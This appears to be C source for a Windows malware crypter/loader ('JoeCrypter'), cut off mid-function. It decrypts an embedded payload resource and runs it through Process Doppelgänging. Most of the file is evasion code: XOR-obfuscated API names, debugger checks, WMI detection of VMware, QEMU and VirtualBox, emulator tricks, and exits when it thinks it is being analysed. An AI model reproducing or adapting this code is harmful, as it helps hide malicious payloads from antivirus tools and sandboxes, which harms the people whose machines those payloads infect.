// transactional injection MUST BE 64 bit, therefore, we CANNOT use inline assembly. 
#include <winsock2.h>
#include <iphlpapi.h>
#include <KtmW32.h>
#include <icmpapi.h>
#include <windows.h>
#include <stdio.h>
#include <wbemidl.h>
#include <time.h>
#include <Objbase.h>
#include <rpcdcep.h>
#include "joecrypt_injecter.h"
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#define WIN32_LEAN_AND_MEAN
#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383

#define STATUS_SUCCESS				((NTSTATUS)0x00000000L) // ntsubauth
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) == STATUS_SUCCESS)
#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )
#define PS_INHERIT_HANDLES          4
#define RTL_USER_PROC_PARAMS_NORMALIZED     0x00000001
#define RTL_MAX_DRIVE_LETTERS 32

#ifndef KPRIORITY
typedef LONG KPRIORITY;
#endif
void ProcessDoppelgÃ¤nging(LPWSTR lpTargetApp, LPWSTR lpPayloadApp);
typedef struct _UNICODE_STRING 
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;
typedef UNICODE_STRING *PUNICODE_STRING;

typedef struct _RTL_DRIVE_LETTER_CURDIR {
	USHORT                  Flags;
	USHORT                  Length;
	ULONG                   TimeStamp;
	UNICODE_STRING          DosPath;
} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;

typedef struct _PEB_LDR_DATA {
	ULONG                   Length;
	BOOLEAN                 Initialized;
	PVOID                   SsHandle;
	LIST_ENTRY              InLoadOrderModuleList;
	LIST_ENTRY              InMemoryOrderModuleList;
	LIST_ENTRY              InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _CURDIR
{
	UNICODE_STRING DosPath;
	HANDLE Handle;
} CURDIR, *PCURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS
{
	ULONG MaximumLength;
	ULONG Length;

	ULONG Flags;
	ULONG DebugFlags;

	HANDLE ConsoleHandle;
	ULONG ConsoleFlags;
	HANDLE StandardInput;
	HANDLE StandardOutput;
	HANDLE StandardError;

	CURDIR CurrentDirectory;
	UNICODE_STRING DllPath;
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
	PVOID Environment;

	ULONG StartingX;
	ULONG StartingY;
	ULONG CountX;
	ULONG CountY;
	ULONG CountCharsX;
	ULONG CountCharsY;
	ULONG FillAttribute;

	ULONG WindowFlags;
	ULONG ShowWindowFlags;
	UNICODE_STRING WindowTitle;
	UNICODE_STRING DesktopInfo;
	UNICODE_STRING ShellInfo;
	UNICODE_STRING RuntimeData;
	RTL_DRIVE_LETTER_CURDIR CurrentDirectories[26];

	ULONG EnvironmentSize;
	ULONG EnvironmentVersion;
    PVOID PackageDependencyData; //8+
    ULONG ProcessGroupId;
   // ULONG LoaderThreads;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB_FREE_BLOCK // 2 elements, 0x8 bytes
{
   struct _PEB_FREE_BLOCK * pNext;
   DWORD dwSize;
} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;


typedef void (*PPEBLOCKROUTINE)(
								PVOID PebLock
								);

typedef struct _PEB {
	BOOLEAN                 InheritedAddressSpace;
	BOOLEAN                 ReadImageFileExecOptions;
	BOOLEAN                 BeingDebugged;
	BOOLEAN                 Spare;
	HANDLE                  Mutant;
	PVOID                   ImageBaseAddress;
	PPEB_LDR_DATA           LoaderData;
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
	PVOID                   SubSystemData;
	PVOID                   ProcessHeap;
	PVOID                   FastPebLock;
	PPEBLOCKROUTINE         FastPebLockRoutine;
	PPEBLOCKROUTINE         FastPebUnlockRoutine;
	ULONG                   EnvironmentUpdateCount;
	PVOID*                  KernelCallbackTable;
	PVOID                   EventLogSection;
	PVOID                   EventLog;
	PPEB_FREE_BLOCK         FreeList;
	ULONG                   TlsExpansionCounter;
	PVOID                   TlsBitmap;
	ULONG                   TlsBitmapBits[0x2];
	PVOID                   ReadOnlySharedMemoryBase;
	PVOID                   ReadOnlySharedMemoryHeap;
	PVOID*                  ReadOnlyStaticServerData;
	PVOID                   AnsiCodePageData;
	PVOID                   OemCodePageData;
	PVOID                   UnicodeCaseTableData;
	ULONG                   NumberOfProcessors;
	ULONG                   NtGlobalFlag;
	BYTE                    Spare2[0x4];
	LARGE_INTEGER           CriticalSectionTimeout;
	ULONG                   HeapSegmentReserve;
	ULONG                   HeapSegmentCommit;
	ULONG                   HeapDeCommitTotalFreeThreshold;
	ULONG                   HeapDeCommitFreeBlockThreshold;
	ULONG                   NumberOfHeaps;
	ULONG                   MaximumNumberOfHeaps;
	PVOID*                  *ProcessHeaps;
	PVOID                   GdiSharedHandleTable;
	PVOID                   ProcessStarterHelper;
	PVOID                   GdiDCAttributeList;
	PVOID                   LoaderLock;
	ULONG                   OSMajorVersion;
	ULONG                   OSMinorVersion;
	ULONG                   OSBuildNumber;
	ULONG                   OSPlatformId;
	ULONG                   ImageSubSystem;
	ULONG                   ImageSubSystemMajorVersion;
	ULONG                   ImageSubSystemMinorVersion;
	ULONG                   GdiHandleBuffer[0x22];
	ULONG                   PostProcessInitRoutine;
	ULONG                   TlsExpansionBitmap;
	BYTE                    TlsExpansionBitmapBits[0x80];
	ULONG                   SessionId;
} PEB, *PPEB;

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PPEB PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

/*
typedef struct _PROCESS_BASIC_INFORMATION {
	NTSTATUS ExitStatus;
	PVOID PebBaseAddress;
	ULONG_PTR AffinityMask;
	KPRIORITY BasePriority;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;
typedef PROCESS_BASIC_INFORMATION *PPROCESS_BASIC_INFORMATION;
*/
typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;        // Points to type SECURITY_DESCRIPTOR
    PVOID SecurityQualityOfService;  // Points to type SECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES;
typedef OBJECT_ATTRIBUTES *POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );        \
    (p)->RootDirectory = r;                           \
    (p)->Attributes = a;                              \
    (p)->ObjectName = n;                              \
    (p)->SecurityDescriptor = s;                      \
    (p)->SecurityQualityOfService = NULL;             \
    }

typedef enum _PROCESSINFOCLASS {
	ProcessBasicInformation = 0,
	ProcessQuotaLimits = 1,
	ProcessIoCounters = 2,
	ProcessVmCounters = 3,
	ProcessTimes = 4,
	ProcessBasePriority = 5,
	ProcessRaisePriority = 6,
	ProcessDebugPort = 7,
	ProcessExceptionPort = 8,
	ProcessAccessToken = 9,
	ProcessLdtInformation = 10,
	ProcessLdtSize = 11,
	ProcessDefaultHardErrorMode = 12,
	ProcessIoPortHandlers = 13,
	ProcessPooledUsageAndLimits = 14,
	ProcessWorkingSetWatch = 15,
	ProcessUserModeIOPL = 16,
	ProcessEnableAlignmentFaultFixup = 17,
	ProcessPriorityClass = 18,
	ProcessWx86Information = 19,
	ProcessHandleCount = 20,
	ProcessAffinityMask = 21,
	ProcessPriorityBoost = 22,
	ProcessDeviceMap = 23,
	ProcessSessionInformation = 24,
	ProcessForegroundInformation = 25,
	ProcessWow64Information = 26,
	ProcessImageFileName = 27,
	ProcessLUIDDeviceMapsEnabled = 28,
	ProcessBreakOnTermination = 29,
	ProcessDebugObjectHandle = 30,
	ProcessDebugFlags = 31,
	ProcessHandleTracing = 32,
	ProcessIoPriority = 33,
	ProcessExecuteFlags = 34,
	ProcessTlsInformation = 35,
	ProcessCookie = 36,
	ProcessImageInformation = 37,
	ProcessCycleTime = 38,
	ProcessPagePriority = 39,
	ProcessInstrumentationCallback = 40,
	ProcessThreadStackAllocation = 41,
	ProcessWorkingSetWatchEx = 42,
	ProcessImageFileNameWin32 = 43,
	ProcessImageFileMapping = 44,
	ProcessAffinityUpdateMode = 45,
	ProcessMemoryAllocationMode = 46,
	ProcessGroupInformation = 47,
	ProcessTokenVirtualizationEnabled = 48,
	ProcessOwnerInformation = 49,
	ProcessWindowInformation = 50,
	ProcessHandleInformation = 51,
	ProcessMitigationPolicy = 52,
	ProcessDynamicFunctionTableInformation = 53,
	ProcessHandleCheckingMode = 54,
	ProcessKeepAliveCount = 55,
	ProcessRevokeFileHandles = 56,
	ProcessWorkingSetControl = 57,
	ProcessHandleTable = 58,
	ProcessCheckStackExtentsMode = 59,
	ProcessCommandLineInformation = 60,
	ProcessProtectionInformation = 61,
	MaxProcessInfoClass = 62
} PROCESSINFOCLASS;



typedef NTSTATUS NTAPI NTCREATETRANSACTION(
	     PHANDLE TransactionHandle,
	      ACCESS_MASK DesiredAccess,
	  POBJECT_ATTRIBUTES ObjectAttributes,
	  LPGUID Uow,
	  HANDLE TmHandle,
	  ULONG CreateOptions,
	  ULONG IsolationLevel,
	  ULONG IsolationFlags,
	  PLARGE_INTEGER Timeout,
	  PUNICODE_STRING Description
	);
typedef NTCREATETRANSACTION FAR * LPNTCREATETRANSACTION;

typedef NTSTATUS NTAPI NTALLOCATEVIRTUALMEMORY(
	        HANDLE ProcessHandle,
	     PVOID *BaseAddress,
	        ULONG_PTR ZeroBits,
	     PSIZE_T RegionSize,
	        ULONG AllocationType,
	        ULONG Protect
	);
typedef NTALLOCATEVIRTUALMEMORY FAR * LPNTALLOCATEVIRTUALMEMORY;

typedef NTSTATUS NTAPI NTCREATESECTION(
			PHANDLE SectionHandle,
			ACCESS_MASK DesiredAccess,
		POBJECT_ATTRIBUTES ObjectAttributes,
		PLARGE_INTEGER MaximumSize,
			ULONG SectionPageProtection,
			ULONG AllocationAttributes,
		HANDLE FileHandle
	);
typedef NTCREATESECTION FAR * LPNTCREATESECTION;

typedef NTSTATUS NTAPI NTROLLBACKTRANSACTION(
     HANDLE  TransactionHandle,
     BOOLEAN Wait);
typedef NTROLLBACKTRANSACTION FAR * LPNTROLLBACKTRANSACTION;

typedef NTSTATUS NTAPI NTCLOSE(
	 HANDLE Handle
	);
typedef NTCLOSE FAR * LPNTCLOSE;

typedef NTSTATUS NTAPI NTCREATEPROCESSEX(
        PHANDLE ProcessHandle,
         ACCESS_MASK DesiredAccess,
     POBJECT_ATTRIBUTES ObjectAttributes,
         HANDLE ParentProcess,
         ULONG Flags,
     HANDLE SectionHandle,
     HANDLE DebugPort,
     HANDLE ExceptionPort,
         BOOLEAN InJob);
typedef NTCREATEPROCESSEX FAR * LPNTCREATEPROCESSEX;

typedef NTSTATUS NTAPI NTQUERYINFORMATIONPROCESS(
			HANDLE ProcessHandle,
			PROCESSINFOCLASS ProcessInformationClass,
			PVOID ProcessInformation,
			ULONG ProcessInformationLength,
		PULONG ReturnLength
	);
typedef NTQUERYINFORMATIONPROCESS FAR * LPNTQUERYINFORMATIONPROCESS;

typedef NTSTATUS NTAPI NTREADVIRTUALMEMORY(
			HANDLE ProcessHandle,
		PVOID BaseAddress,
			PVOID Buffer,
			SIZE_T BufferSize,
		PSIZE_T NumberOfBytesRead
	);
typedef NTREADVIRTUALMEMORY FAR * LPNTREADVIRTUALMEMORY;

typedef NTSTATUS NTAPI NTWRITEVIRTUALMEMORY(
	        HANDLE ProcessHandle,
	    PVOID BaseAddress,
	        VOID *Buffer,
	        SIZE_T BufferSize,
	   PSIZE_T NumberOfBytesWritten
	);
typedef NTWRITEVIRTUALMEMORY FAR * LPNTWRITEVIRTUALMEMORY;

typedef NTSTATUS NTAPI NTCREATETHREADEX(
     PHANDLE hThread,
      ACCESS_MASK DesiredAccess,
      LPVOID ObjectAttributes,
      HANDLE ProcessHandle,
      LPTHREAD_START_ROUTINE lpStartAddress,
      LPVOID lpParameter,
      BOOL CreateSuspended,
      DWORD StackZeroBits,
      DWORD SizeOfStackCommit,
      DWORD SizeOfStackReserve,
     LPVOID lpBytesBuffer);
typedef NTCREATETHREADEX FAR * LPNTCREATETHREADEX;

typedef NTSTATUS NTAPI NTFREEVIRTUALMEMORY(
	       HANDLE ProcessHandle,
	    PVOID *BaseAddress,
	    PSIZE_T RegionSize,
	       ULONG FreeType
	);
typedef NTFREEVIRTUALMEMORY FAR * LPNTFREEVIRTUALMEMORY;

LPNTCREATETRANSACTION		NtCreateTransaction;
LPNTALLOCATEVIRTUALMEMORY	NtAllocateVirtualMemory;
LPNTCREATESECTION			NtCreateSection;
LPNTROLLBACKTRANSACTION		NtRollbackTransaction;
LPNTCLOSE					NtClose;
LPNTCREATEPROCESSEX			NtCreateProcessEx;
LPNTQUERYINFORMATIONPROCESS	NtQueryInformationProcess;
LPNTREADVIRTUALMEMORY		NtReadVirtualMemory;
LPNTWRITEVIRTUALMEMORY		NtWriteVirtualMemory;
LPNTCREATETHREADEX			NtCreateThreadEx;
LPNTFREEVIRTUALMEMORY		NtFreeVirtualMemory;


typedef NTSTATUS NTAPI RTLCREATEPROCESSPARAMETERSEX(
     PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
     PUNICODE_STRING ImagePathName,
     PUNICODE_STRING DllPath,
     PUNICODE_STRING CurrentDirectory,
     PUNICODE_STRING CommandLine,
     PVOID Environment,
     PUNICODE_STRING WindowTitle,
     PUNICODE_STRING DesktopInfo,
     PUNICODE_STRING ShellInfo,
     PUNICODE_STRING RuntimeData,
     ULONG Flags);
typedef RTLCREATEPROCESSPARAMETERSEX FAR * LPRTLCREATEPROCESSPARAMETERSEX;

typedef NTSTATUS NTAPI RTLDESTROYPROCESSPARAMETERS(
     PRTL_USER_PROCESS_PARAMETERS ProcessParameters
    );
typedef RTLDESTROYPROCESSPARAMETERS FAR * LPRTLDESTROYPROCESSPARAMETERS;

LPRTLCREATEPROCESSPARAMETERSEX		RtlCreateProcessParametersEx;
LPRTLDESTROYPROCESSPARAMETERS		RtlDestroyProcessParameters;


typedef PIMAGE_NT_HEADERS NTAPI RTLIMAGENTHEADER(
	 PVOID Base
	);
typedef RTLIMAGENTHEADER FAR * LPRTLIMAGENTHEADER;
LPRTLIMAGENTHEADER			RtlImageNtHeader;


typedef PVOID NTAPI RTLINITUNICODESTRING(
		PUNICODE_STRING DestinationString,
     PCWSTR SourceString
	);
typedef RTLINITUNICODESTRING FAR * LPRTLINITUNICODESTRING;
LPRTLINITUNICODESTRING			RtlInitUnicodeString;



// function prototypes
//replaceatbeginning0
//replaceatbeginning1
//replaceatbeginning2
//replaceatbeginning3
//replaceatbeginning4
//replaceatbeginning5
//replaceatbeginning6
//replaceatbeginning7
//replaceatbeginning8
//replaceatbeginning9
byte *GetPayload(void);
//byte *decrypted(byte *data, int length, int crytptkey); // moved to joecrypt_injecter.h
//WCHAR *widedecrypt(byte *data, int length, int crytptkey); // moved to joecrypt_injecter.h
extern unsigned int __cdecl longStall_ASM(void);
int procmem_evas(void);
int NumaEvas(void);
int AllocMem_Fornoreason(void);
void MemSizeTrick(void);
int LotsOfWindows(HWND);
int FlsTrick(void);
int timing_evasion_1(void);
int timing_evasion_2(void);
int timing_evasion_3(void);
int timing_evasion_4(void);
int timing_evasion_5(void);
int timing_evasion_6(void);
extern void __cdecl GetBeingDebugged_ASM(void);
extern void __cdecl IsInsideVMWare_ASM(void);
extern void __cdecl GetNtGlobalFlags_ASM(void);
void checkQIP(void);
extern void __cdecl GetHeapFlags_ASM(void);
void anti_vm_wmi_1(void);
void anti_vm_wmi_2(void);
void anti_vm_wmi_3(void);
void anti_vm_wmi_4(void);
void anti_vm_wmi_5(void);
void anti_vm_wmi_6(void);
void anti_vm_wmi_7(void);
int reg_enum_vm_check(void);
int AntiEmu(void);
void JoeSpecial(void);
void special_usercheck(void);
// void AnotherAntiDebugRoutine(void); doesnt work 64 bit AT ALL
extern void __cdecl GS_Check_ASM(void);
void AntiProcMon(void);
void date_specific_check(char *shortdate);
void region_specific_check(char *region);
void CheckCoreCount(void);
void testsigning(void);
//const char g_szClassName[] = "JoeCrypter";

DWORD rsrc_len = 0;

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    switch(msg)
    {
		case WM_CREATE:
		{	
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
			byte *payload = decrypted(GetPayload(),rsrc_len, cryptokey);
			// writefile to %%temp% and run with createprocess or shellexec or something
			//ExecFile(decrypted("f?YYrlkajrvYYv|vq`h67YYkjq`uda+`}`",34,5),payload); // xor'd by 5 from c:\\windows\\system32\\notepad.exe	
			ProcessDoppelgÃ¤nging(L"nslookup32.exe", L"countcores64.exe");
			// have to write file before we dopplegang it 
			
			
		}
		break;
        case WM_CLOSE:
            DestroyWindow(hwnd);
        break;
        case WM_DESTROY:
            PostQuitMessage(0);
        break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR lpCmdLine, int nCmdShow)
{
	checkQIP();
	GetNtGlobalFlags_ASM();
    WNDCLASSEX wc;
    HWND hwnd;
    MSG Msg;

    wc.cbSize        = sizeof(WNDCLASSEX);
    wc.style         = 0;
    wc.lpfnWndProc   = WndProc;
    wc.cbClsExtra    = 0;
    wc.cbWndExtra    = 0;
    wc.hInstance     = hInstance;
    wc.hIcon         = LoadIcon(NULL, IDI_APPLICATION);
    wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
    wc.lpszMenuName  = NULL;

	char mystr[9];
	char name2[9];
	DWORD kek = GetTickCount();
	sprintf(mystr,"%x",kek);
	// random window name
	int kk = rand() % (256 - 64 + 1) + 64;
	Sleep(kk);
	// random stall for to ensure window name and title are different 
	DWORD rekt = GetTickCount();
	sprintf(name2,"%x",rekt);

	// ^^ random class name please :)
    wc.lpszClassName = mystr;
    wc.hIconSm       = LoadIcon(NULL, IDI_APPLICATION);

    if(!RegisterClassEx(&wc))
    {
        return 0;
    }

    hwnd = CreateWindowEx(
        WS_EX_CLIENTEDGE,
        mystr,
        name2,
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, kk, kk, //changed 240, 120 to use the random val
        NULL, NULL, hInstance, NULL);



    if(hwnd == NULL)
    {
        return 0;
    }

    ShowWindow(hwnd, SW_HIDE);
    UpdateWindow(hwnd);
    while(GetMessage(&Msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }
    return Msg.wParam;
}


byte *GetPayload(void)
{
	char *retmsg = NULL;
	char pth[MAX_PATH];
	GetModuleFileName(NULL,pth,MAX_PATH);
	HMODULE hexe = LoadLibrary(pth);

	HRSRC pres = FindResource(hexe,MAKEINTRESOURCE(8001),RT_RCDATA);
	if(pres == NULL)
	{
		
		return (byte*)retmsg ;
	}
	byte *hResLoad = LoadResource(hexe,pres);
	rsrc_len = SizeofResource(hexe, pres); // store in global var value for later

	if(hResLoad == NULL)
	{
		
		return (byte*)retmsg;
	}
	return hResLoad;
}






typedef volatile struct _PROCESS_MEMORY_COUNTERS {
  DWORD  cb;
  DWORD  PageFaultCount;
  SIZE_T PeakWorkingSetSize;
  SIZE_T WorkingSetSize;
  SIZE_T QuotaPeakPagedPoolUsage;
  SIZE_T QuotaPagedPoolUsage;
  SIZE_T QuotaPeakNonPagedPoolUsage;
  SIZE_T QuotaNonPagedPoolUsage;
  SIZE_T PagefileUsage;
  SIZE_T PeakPagefileUsage;
} PROCESS_MEMORY_COUNTERS, *PPROCESS_MEMORY_COUNTERS;

typedef BOOL (*_GetProcessMemoryInfo)(HANDLE proc, PPROCESS_MEMORY_COUNTERS pmc, DWORD cb);
	_GetProcessMemoryInfo GetProcMem;

int procmem_evas(void)
{
	  char *dll = "wtfwn)ckk"; // psapi.dll
	char *funcname = "DfwSql`fppNfnlqzJmel"; // GetProcessMemoryInfo
	PROCESS_MEMORY_COUNTERS pmc;
GetProcMem = (_GetProcessMemoryInfo)GetProcAddress(LoadLibrary(decrypted(dll,9,7)),decrypted(funcname,20,3));


GetProcMem(GetCurrentProcess(), &pmc, sizeof(pmc));
  if(pmc.WorkingSetSize<=3456789)
  {

   return 0;
  }
  else
  {
  // debugger / AV detected
		
	ExitProcess(0);
	
  }
return 0;
}
typedef LPVOID (*_VirtualAllocExNuma) (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, 
	DWORD  flAllocationType, DWORD  flProtect, DWORD  nndPreferred); _VirtualAllocExNuma Numa;
int NumaEvas(void) // doesnt work on xp
{
	OSVERSIONINFO osvi;
	GetVersionEx(&osvi);
	char *libname = "jdsodm23/emm"; // kernel32.dll,12,1
	char *funcname = "TkpvwcnCnnmaGzLwoc"; // VirtualAllocExNuma,18,2
	ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	 if(osvi.dwMajorVersion >= 6)
	 {
	 Numa = (_VirtualAllocExNuma)GetProcAddress(LoadLibrary(decrypted(libname,12,1)),decrypted(funcname,18,2));
	 
	 LPVOID mem = NULL;
	 mem = Numa(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE,0);
	 if(mem != NULL)
	 {
	 return 0; // return to main prog
	 }
	 else
	 {
		// exit process
	 	ExitProcess(0);
		return 0;
	 }
	}
	else
	{
		// no numa on xp so....
		return 1;
	}
}

int AllocMem_Fornoreason(void)
{
	int x;
	for(x=0;x<3;x++)
	{
	// allocate like 350 megs of ram, then free, rinse repeat a couple times.
	LPVOID kek = VirtualAlloc(NULL,367001600, MEM_RESERVE | MEM_COMMIT,0x40);
	Sleep(5012); // Sleep 5 seconds and free
	VirtualFree(kek,367001600,MEM_RELEASE|MEM_DECOMMIT);
	}
	return 0;
}

 typedef HWND( *_CreateWindowExA)( DWORD dwExStyle, LPCTSTR lpClassName,LPCTSTR lpWindowName, DWORD dwStyle, int x, int y, int nWidth,
 int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam);
    _CreateWindowExA CreateDaWindow;
int LotsOfWindows(HWND mainwindow) 
{ 
	char *libname = "~xny89%ogg"; // user32.dll,10,11
	char *funcname = "J{lh}l^`gmf~LqH"; // CreateWindowExA,15,9
	HWND hoep;
	CreateDaWindow = (_CreateWindowExA)GetProcAddress(LoadLibrary(decrypted(libname,10,11)),decrypted(funcname,15,9));
	
	int x;
	for(x=0;x<12321;x++)
	{
		if(x % 2 == 0) // even
		{
			WNDCLASSEX wc;
			wc.cbSize        = sizeof(WNDCLASSEX);
    		wc.style         = 0;
    		wc.lpfnWndProc   = NULL;
    		wc.cbClsExtra    = 0;
    		wc.cbWndExtra    = 0;
    		wc.hInstance     = NULL;
    		wc.hIcon         = LoadIcon(NULL, IDI_APPLICATION);
    		wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
    		wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
    		wc.lpszMenuName  = NULL;
    		wc.lpszClassName = "Explorer";
    		wc.hIconSm       = LoadIcon(NULL, IDI_APPLICATION);
			RegisterClassEx(&wc);
			
			char mystr[9]; // random window names
			DWORD kek = GetTickCount();
			sprintf(mystr,"%x",kek);
			hoep = CreateDaWindow(0x00000200,mystr,mystr,0x00200000,CW_USEDEFAULT, CW_USEDEFAULT,0,0,mainwindow,NULL,NULL, NULL);
			ShowWindow(hoep,SW_SHOWNORMAL);
			UpdateWindow(hoep);

		}
		if(x % 2 == 1 || x % 2 == -1) // odd
		{
			WNDCLASSEX wc;
			wc.cbSize        = sizeof(WNDCLASSEX);
    		wc.style         = 0;
    		wc.lpfnWndProc   = NULL;
    		wc.cbClsExtra    = 0;
    		wc.cbWndExtra    = 0;
    		wc.hInstance     = NULL;
    		wc.hIcon         = LoadIcon(NULL, IDI_APPLICATION);
    		wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
    		wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
    		wc.lpszMenuName  = NULL;
    		wc.lpszClassName = "lol";
    		wc.hIconSm       = LoadIcon(NULL, IDI_APPLICATION);
			RegisterClassEx(&wc);
			
			char mystr[9]; // random window names
			DWORD kek = GetTickCount();
			sprintf(mystr,"%x",kek);
			hoep = CreateDaWindow(0x00000200,mystr,mystr,0x00040000,CW_USEDEFAULT, CW_USEDEFAULT,0,0,mainwindow,NULL,NULL, NULL);
			ShowWindow(hoep,SW_SHOWNORMAL);
			UpdateWindow(hoep);
			}

	}
	
    return 0;
}
typedef DWORD (*_FlsAlloc) (PFLS_CALLBACK_FUNCTION lpCallback); _FlsAlloc FlsCrap;
int FlsTrick(void)
{
	char *libname = "Mcthcj54(bjj"; // Kernel32.dll,12,6
	char *funcname = "EopBool`"; // FlsAlloc,8,3
	FlsCrap = (_FlsAlloc)GetProcAddress(LoadLibrary( decrypted(libname,12,6)) ,decrypted(funcname,8,3));
	
	OSVERSIONINFO osvi;
	ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&osvi);
    if(osvi.dwMajorVersion >= 6)
    {
		DWORD result =  FlsCrap(NULL);
		if(result != FLS_OUT_OF_INDEXES)
		{
		return 0;
		}
		else
		{
			ExitProcess(1);
			return 0;
		}
	}
	else
	{
		// XP means no FlsAlloc() :(
		return 1;
	}
}










typedef NTSTATUS ( WINAPI *NQIP )( HANDLE, LONG, PVOID, ULONG, PULONG );
	
void checkQIP(void)
{
	char *libname = "mwgoo-goo"; // ntdll.dll,9,3
	char *funcname = "JpUqav}MjbkviepmkjTvkgaww"; // NtQueryInformationProcess,25,4
	
	NQIP NtQueryInformationProcess = ( NQIP )GetProcAddress( GetModuleHandle( decrypted(libname,9,3) ), decrypted(funcname,25,4) );
	int returnValue = 0;
	NtQueryInformationProcess( GetCurrentProcess( ), 0x7, &returnValue, 4, 0 );
	if( returnValue != 0 )
	{
		ExitProcess(0);
	}
}

void anti_vm_wmi_1(void)
{
    // result code from COM calls
    HRESULT hr = 0;
    // COM interface pointers
    IWbemLocator         *locator  = NULL;
    IWbemServices        *services = NULL;
    IEnumWbemClassObject *results  = NULL;
    BSTR resource = SysAllocString(widedecrypt("YDD_WWHBF]9",11,11)); //  ROOT\\CIMV2,11,11
    BSTR language = SysAllocString(widedecrypt("Y_B",3,14)); // WQL,3,14
    //BSTR query    = SysAllocString(L"SELECT * FROM Win32_DiskDrive");
	BSTR query    = SysAllocString(widedecrypt("WAHAGP$.$BVKI$Smj76[@mwo@vmra",29,4));

    hr = CoInitializeEx(0, COINIT_MULTITHREADED);
    hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    hr = CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (LPVOID *) &locator);
    hr = locator->lpVtbl->ConnectServer(locator, resource, NULL, NULL, NULL, 0, NULL, NULL, &services);
    hr = services->lpVtbl->ExecQuery(services, language, query, WBEM_FLAG_BIDIRECTIONAL, NULL, &results);
    if (results != NULL) {
        IWbemClassObject *result = NULL;
        ULONG returnedCount = 0;
        while((hr = results->lpVtbl->Next(results, WBEM_INFINITE, 1, &result, &returnedCount)) == S_OK) {
            VARIANT caption;
            hr = result->lpVtbl->Get(result, widedecrypt("Fduqljk",7,5), 0, &caption, 0, 0); // Caption
			char prop[128];
			wcstombs(prop,caption.bstrVal,SysStringByteLen(caption.bstrVal));
			char *vm1 = decrypted("UAIQ",4,4); // QEMU
			char *vm2 = decrypted("_D~h{l",6,9); // VMware
			char *vm3 = decrypted("pdi~",4,6); // vbox

			if(strstr(prop,vm1))
			{
		jumptoself_ASM();
			}

			if(strstr(prop,vm2))
			{
		jumptoself_ASM();
			}

			if(strstr(prop,vm3))
			{
		jumptoself_ASM();
			}
            result->lpVtbl->Release(result);
        }
    }
    // release WMI COM interfaces
    results->lpVtbl->Release(results);
    services->lpVtbl->Release(services);
    locator->lpVtbl->Release(locator);

    // unwind everything else we've allocated
    CoUninitialize();

    SysFreeString(query);
    SysFreeString(language);
    SysFreeString(resource);
	return; // yay no vm
}

void anti_vm_wmi_2(void)
{
	HRESULT hr = 0;
    IWbemLocator         *locator  = NULL;
    IWbemServices        *services = NULL;
    IEnumWbemClassObject *results  = NULL;
    BSTR resource = SysAllocString(widedecrypt("YDD_WWHBF]9",11,11)); //  ROOT\\CIMV2,11,11
    BSTR language = SysAllocString(widedecrypt("Y_B",3,14)); // WQL,3,14
    BSTR query    = SysAllocString(widedecrypt("TBKBDS'-'AUHJ'Pni45XENHT",24,7)); //SELECT * FROM Win32_BIOS
    hr = CoInitializeEx(0, COINIT_MULTITHREADED);
    hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    hr = CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (LPVOID *) &locator);
    hr = locator->lpVtbl->ConnectServer(locator, resource, NULL, NULL, NULL, 0, NULL, NULL, &services);
